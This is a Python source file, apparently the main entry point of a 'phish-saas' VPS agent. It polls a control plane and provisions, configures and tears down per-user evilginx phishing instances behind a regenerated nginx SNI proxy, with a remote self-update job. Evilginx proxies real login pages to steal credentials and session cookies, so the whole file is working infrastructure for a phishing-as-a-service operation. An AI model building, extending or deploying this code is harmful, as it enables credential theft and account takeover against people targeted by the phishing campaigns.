"""VPS agent entry point.

Distributing evilginx instances across a VPS:
  - heartbeats to the control plane
  - polls for pending provision/teardown jobs
  - manages one evilginx instance per user (pty-driven terminal)
  - regenerates the nginx SNI proxy config
  - keeps alive/reconciles running instances

Usage:
  agent/main.py --agent-secret ... --vps-id ... [--control-url ...]
"""
import argparse
import logging
import os
import sys
import time
from pathlib import Path

from agent.config import AgentSettings, load_settings
from agent.control import ControlClient, ControlError
from agent.evilginx_manager import InstanceManager
from agent.nginx_manager import render_http, render_sni, apply
from agent.system import get_public_ip, ps_metrics

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
logger = logging.getLogger("agent")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="phish-saas VPS agent")
    p.add_argument("--control-url", default=None, help="control plane base URL")
    p.add_argument("--agent-secret", default=None, help="this VPS agent secret")
    p.add_argument("--vps-id", default=None, help="this VPS id in the control plane")
    p.add_argument("--external-ip", default=None, help="this VPS public IP")
    p.add_argument("--dry-run", action="store_true", help="do not touch loopback aliases / nginx")
    p.add_argument("--onetime", action="store_true", help="handle pending jobs once and exit")
    return p


def main() -> int:
    args = build_parser().parse_args()
    settings = load_settings()
    if args.control_url:
        settings.control_url = args.control_url
    if args.agent_secret or os.environ.get("AGENT_SECRET"):
        settings.agent_secret = args.agent_secret or os.environ["AGENT_SECRET"]
    if args.vps_id:
        settings.vps_id = args.vps_id
    if args.external_ip:
        settings.external_ip = args.external_ip
    if args.dry_run:
        settings.nginx_apply = False
        settings.loopback_apply = False

    if not settings.agent_secret:
        logger.error("AGENT_SECRET required (--agent-secret or env)")
        return 2
    if not settings.vps_id:
        logger.warning("AGENT_VPS_ID not set — will identify by public IP; "
                       "you MUST configure the VPS with this IP in the admin panel")

    if not settings.external_ip:
        ip = get_public_ip()
        settings.external_ip = ip or "127.0.0.1"
        logger.info("public IP: %s", settings.external_ip)

    # make state file path sane for dry runs under a different root
    if settings.state_file == "/opt/evilginx/agent-state.json" and settings.data_root != "/opt/evilginx/users":
        settings.state_file = str(Path(settings.data_root).parent / "agent-state.json")

    client = ControlClient(settings)
    manager = InstanceManager(settings)
    root_log = Path(settings.data_root).parent / "logs"
    root_log.mkdir(parents=True, exist_ok=True)

    def config_dir_for(payload: dict) -> Path:
        """Rewrite the config dir to this agent's root (prevents hardcoding
        /opt/evilginx/users/<uid> paths outside the VPS)."""
        rewrite = not payload.get("config_dir", "").startswith(settings.config_root.rstrip("/") + "/")
        if rewrite and "/opt/evilginx/users/" in payload.get("config_dir", ""):
            uid = payload["config_dir"].rsplit("/", 1)[-1]
            rewritten = str(Path(settings.config_root) / uid)
            logger.info("rewrote config_dir %s -> %s", payload["config_dir"], rewritten)
            payload["config_dir"] = rewritten
        return Path(payload["config_dir"])

    # First reconcile (restart instances recorded in local state).
    try:
        manager.reconcile(root_log)
    except Exception as exc:
        logger.error("reconcile failed: %s", exc)

    first_heartbeat = True
    while True:
        try:
            load, mem, disk = ps_metrics()
            active = len(manager.state.all())
            hb = client.heartbeat(hostname=os.uname().nodename, load=load,
                                  mem_used_pct=mem, disk_used_pct=disk, active_instances=active)
            if first_heartbeat:
                if not settings.vps_id:
                    settings.vps_id = hb.get("vps_id", settings.vps_id)
                logger.info("heartbeat ok (vps %s, max_users=%s)", hb.get("vps_id"), hb.get("max_users"))
                first_heartbeat = False

            jobs = client.fetch_jobs()
            if jobs:
                logger.info("%d pending job(s)", len(jobs))
            for job in jobs:
                _handle_job(client, manager, job, root_log, config_dir_for)

            if args.onetime:
                return 0

        except ControlError as exc:
            logger.warning("control-plane error: %s", exc)
        except KeyboardInterrupt:
            logger.info("shutting down")
            return 0
        except Exception as exc:
            logger.exception("agent loop error: %s", exc)

        time.sleep(settings.poll_interval)


def _handle_job(client: ControlClient, manager: InstanceManager, job: dict, log_dir: Path,
                config_dir_for=None):
    job_id = job["id"]
    job_type = job["type"]
    payload = job["payload"]
    logger.info("running job %s (%s)", job_id, job_type)
    try:
        if config_dir_for is not None and job_type in ("provision", "teardown", "configure"):
            config_dir_for(payload)
        if job_type == "provision":
            payload.setdefault("external_ipv4", manager.settings.external_ip)
            result = manager.provision(payload, log_dir)
            client.report_job(job_id, True, result)
        elif job_type == "teardown":
            manager.teardown(payload)
            client.report_job(job_id, True, {"ok": True})
        elif job_type == "configure":
            result = manager.configure(payload)
            client.report_job(job_id, True, result)
        elif job_type == "ping":
            client.report_job(job_id, True, {"pong": True})
        elif job_type == "self_update":
            import subprocess, shutil, glob
            repo = str(Path(__file__).resolve().parent.parent)
            subprocess.run(["git", "-C", repo, "pull", "--ff-only"], check=True, capture_output=True)
            agent_dir = Path(__file__).resolve().parent
            dest = Path("/opt/ramses/agent")
            for f in glob.glob(str(agent_dir / "*.py")):
                shutil.copy2(f, dest)
            client.report_job(job_id, True, {"updated": True})
            logger.info("self-update complete, restarting...")
            subprocess.run(["systemctl", "restart", "ramses-agent"], check=True)
        else:
            client.report_job(job_id, False, error=f"unknown job type: {job_type}")
    except Exception as exc:
        logger.exception("job %s failed", job_id)
        client.report_job(job_id, False, error=str(exc))
        return

    # Regenerate + apply the SNI proxy config after instance provision/teardown
    # (configure jobs never alter hostnames, so a global nginx reload is skipped).
    if job_type in ("provision", "teardown"):
        try:
            conf_path = Path(manager.settings.nginx_conf)
            sni = render_sni(manager.state.all(), manager.settings.external_ip)
            http = render_http(manager.settings.external_ip)
            apply(sni, http, conf_path, apply=manager.settings.nginx_apply)
        except Exception as exc:
            logger.error("nginx config regeneration failed: %s", exc)


if __name__ == "__main__":
    sys.exit(main())